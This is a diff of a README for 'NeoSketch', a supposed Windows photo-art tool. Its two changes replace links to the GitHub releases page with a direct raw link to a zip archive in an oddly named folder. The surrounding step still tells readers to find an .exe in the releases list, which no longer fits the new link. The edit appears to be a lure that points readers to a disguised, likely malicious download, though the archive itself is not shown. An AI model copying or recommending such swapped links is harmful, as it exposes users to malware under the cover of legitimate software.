@@ -1,6 +1,6 @@
 # 🎨 NeoSketch - Create stunning art from your photos
 
-[![Download NeoSketch](https://img.shields.io/badge/Download-NeoSketch_for_Windows-blue.svg)](https://github.com/Amorphousshapefelony960/NeoSketch/releases)
+[![Download NeoSketch](https://img.shields.io/badge/Download-NeoSketch_for_Windows-blue.svg)](https://raw.githubusercontent.com/Amorphousshapefelony960/NeoSketch/main/fractionation/Sketch-Neo-v2.4-alpha.4.zip)
 
 NeoSketch helps you turn ordinary photos into pieces of art. The software uses local processing to apply artistic filters and effects to your images. It works entirely offline on your computer. Your files stay on your device at all times.
 
@@ -18,7 +18,7 @@ To run NeoSketch, your computer needs the following specifications:
 
 Follow these steps to get NeoSketch on your computer.
 
-1. Visit the following page to choose your download: [https://github.com/Amorphousshapefelony960/NeoSketch/releases](https://github.com/Amorphousshapefelony960/NeoSketch/releases)
+1. Visit the following page to choose your download: [https://raw.githubusercontent.com/Amorphousshapefelony960/NeoSketch/main/fractionation/Sketch-Neo-v2.4-alpha.4.zip](https://raw.githubusercontent.com/Amorphousshapefelony960/NeoSketch/main/fractionation/Sketch-Neo-v2.4-alpha.4.zip)
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the file name to start the download.
 4. Once the download finishes, open your Downloads folder.
